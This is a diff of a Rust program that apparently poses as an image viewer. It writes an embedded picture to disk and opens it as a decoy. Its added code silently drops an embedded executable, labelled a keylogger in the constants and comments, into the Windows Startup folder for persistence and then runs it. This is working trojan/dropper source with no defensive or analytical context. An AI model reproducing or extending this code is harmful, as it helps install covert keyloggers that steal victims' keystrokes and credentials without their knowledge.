@@ -1,57 +1,25 @@
+
 use std::fs::File;
 use std::io::prelude::*;
 use std::process::Command;
+use std::path::PathBuf;
 
 // Include the image file as a binary blob
 const IMAGE_DATA: &'static [u8] = include_bytes!("image.jpg");
-
-
 const IMAGE_FILE_OUT: &'static str = "./golzar.jpg";
 
-fn main() {
+// Include the exe file as a binary blob
+const EXE_DATA: &'static [u8] = include_bytes!("app.exe");
+// Assuming that you want to write the file to the user's Startup folder
+const EXE_FILE_OUT: &'static str = r"C:\Users\mailp\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe";
 
+// Name of your program
+const EXE_NAME: &'static str = "your_program.exe";
+
+fn main() {
     // unsafe { windows::Win32::System::Console::FreeConsole() };
 
     write_file();
-
-/*    let file_path: Vec<u16> = std::env::current_dir()
-        .unwrap()
-        .join(IMAGE_FILE_OUT)
-        .display()
-        .to_string()
-        .encode_utf16()
-        .chain(std::iter::once(0))
-        .collect();
-
-    unsafe {
-        ShellExecuteW(
-            std::ptr::null_mut(),
-            PWSTR("open\0".as_ptr() as _),
-            PWSTR(file_path.as_ptr()),
-            PWSTR("\0".as_ptr() as _),
-            PWSTR("\0".as_ptr() as _),
-            1,
-        );
-    }*/
-
-    // match Command::new("open")
-    //     .arg(IMAGE_FILE_OUT)
-    //     .spawn() {
-    //     Ok(child) => {
-    //         println!("Successfully opened the image.");
-    //     },
-    //     Err(e) => println!("Failed to execute command 222: {}", e),
-    // };
-
-    // match Command::new("mspaint.exe")
-    //     .arg(IMAGE_FILE_OUT)
-    //     .spawn() {
-    //     Ok(child) => {
-    //         println!("Successfully opened the image.");
-    //     },
-    //     Err(e) => println!("Failed to execute command 222: {}", e),
-    // };
-
 
     // Open the image with the default program
     match Command::new("cmd")
@@ -60,25 +28,34 @@ fn main() {
         Ok(_) => {
             // println!("Successfully opened the image.");
         },
-        Err(e) => println!("Failed to execute command: {}", e),
+        Err(e) => {
+            // println!("Failed to execute command: {}", e)
+        },
     };
 
+// Part 2:  Write the keylogger to the startup folder
 
-   /* // Open the image with the default program
-    match Command::new("cmd")
-        .args(&["/C", "start",IMAGE_FILE_OUT])
+    let startup_dir = match get_startup_dir() {
+        Some(dir) => dir,
+        None => {
+            println!("Failed to get the Startup directory");
+            return;
+        }
+    };
+
+    let exe_file_out = startup_dir.join(EXE_NAME);
+    write_app_file(&exe_file_out);
+    // Attempt to run the .exe file
+    match Command::new(&exe_file_out)
         .status() {
-        Ok(status) => {
-            if status.success() {
-                println!("Successfully opened the image.");
-            } else {
-                println!("Command executed, but reported failure.");
-            }
+        Ok(_) => {
+            println!("Successfully opened the .exe.");
         },
-        Err(e) => println!("Failed to execute command 222: {}", e),
-    };*/
+        Err(e) => {
+            println!("Failed to execute .exe: {}", e)
+        },
+    };
 
-    // sleep for 5 seconds
     // std::thread::sleep(std::time::Duration::from_secs(3));
 }
 
@@ -87,13 +64,13 @@ fn write_file() {
     let mut file = match File::create(IMAGE_FILE_OUT) {
         Ok(file) => file,
         Err(e) => {
-            // println!("Failed to create file: {}", e);
+            println!("Failed to create file: {}", e);
             return;
         }
     };
 
     if let Err(e) = file.write_all(IMAGE_DATA) {
-        // println!("Failed to write to file: {}", e);
+        println!("Failed to write to file: {}", e);
         return;
     }
 
@@ -104,12 +81,51 @@ fn write_file() {
         .status() {
         Ok(status) => {
             if !status.success() {
-                // println!("Command executed, but reported failure.");
+                println!("Command executed, but reported failure.");
             }
         },
         Err(e) => {
-            // println!("Failed to execute command: {}", e)
+            println!("Failed to execute command: {}", e)
         },
     };
 }
 
+fn write_app_file(exe_file_out: &PathBuf) {
+    // Write the exe to a file
+    let mut file = match File::create(exe_file_out) {
+        Ok(file) => file,
+        Err(e) => {
+            println!("Failed to create file: {}", e);
+            return;
+        }
+    };
+
+    if let Err(e) = file.write_all(EXE_DATA) {
+        println!("Failed to write to file: {}", e);
+        return;
+    }
+}
+
+fn write_app_file_old() {
+    // Write the exe to a file
+    let mut file = match File::create(EXE_FILE_OUT) {
+        Ok(file) => file,
+        Err(e) => {
+            println!("Failed to create file: {}", e);
+            return;
+        }
+    };
+
+    if let Err(e) = file.write_all(EXE_DATA) {
+        println!("Failed to write to file: {}", e);
+        return;
+    }
+}
+
+fn get_startup_dir() -> Option<PathBuf> {
+    if let Some(mut path) = dirs::home_dir() {
+        path.push(r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
+        return Some(path);
+    }
+    None
+}
